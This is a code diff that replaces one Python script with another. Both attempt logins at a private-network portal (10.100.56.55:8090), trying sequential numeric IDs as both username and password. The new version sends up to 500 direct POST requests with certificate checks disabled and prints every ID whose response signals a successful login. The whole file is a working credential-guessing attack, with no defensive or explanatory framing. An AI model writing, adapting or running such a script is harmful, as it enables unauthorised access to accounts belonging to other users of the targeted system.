@@ -1,30 +1,19 @@
-from selenium import webdriver
-import time
-browser = webdriver.Firefox()
-browser.get('http://10.100.56.55:8090')
-print ("browser opened")
-stack = [0]
-username = browser.find_element_by_css_selector('#usernametxt > td:nth-child(1) > input:nth-child(1)')
-password = browser.find_element_by_css_selector('.tablecss > table:nth-child(1) > tbody:nth-child(1) > tr:nth-child(4) > td:nth-child(1) > input:nth-child(1)')
-enter = browser.find_element_by_css_selector('#logincaption')
-n = 201221000
-for num in range(1,30): 
-    n+=1
-    username.send_keys(str(n))    
-    password.send_keys(str(n))       
-    enter.click()
-    time.sleep(1) 
-    try:
-    	msg = browser.find_element_by_css_selector('.note > xmp:nth-child(1)')
-    except:
-    	try:
-    		msg = browser.find_element_by_css_selector('.errorfont > xmp:nth-child(1)')
-    	except:
-    		print("Error")
-    if msg.text == 'The system could not log you on. Make sure your password is correct':
-        username.clear()
-    else :
-    	print(n)
-    	stack.append(n)
-    	enter.click()
-print(stack)
+from urllib import urlencode
+from urllib2 import urlopen
+import urllib2
+from bs4 import BeautifulSoup
+import ssl
+url = "https://10.100.56.55:8090/httpclient.html"
+context = ssl._create_unverified_context()
+id = 201601000
+#pwd = ""
+for num in range(1,500):
+    id+=1
+    mode = "191"
+    params = urlencode({'mode' : mode , 'username' : id , 'password' : id})
+    res = urllib2.urlopen(url,params,context=context)
+    bs = BeautifulSoup(res,"html.parser")
+    data = bs.message
+    str_size = len(data.text)
+    if str_size != 67:
+        print id
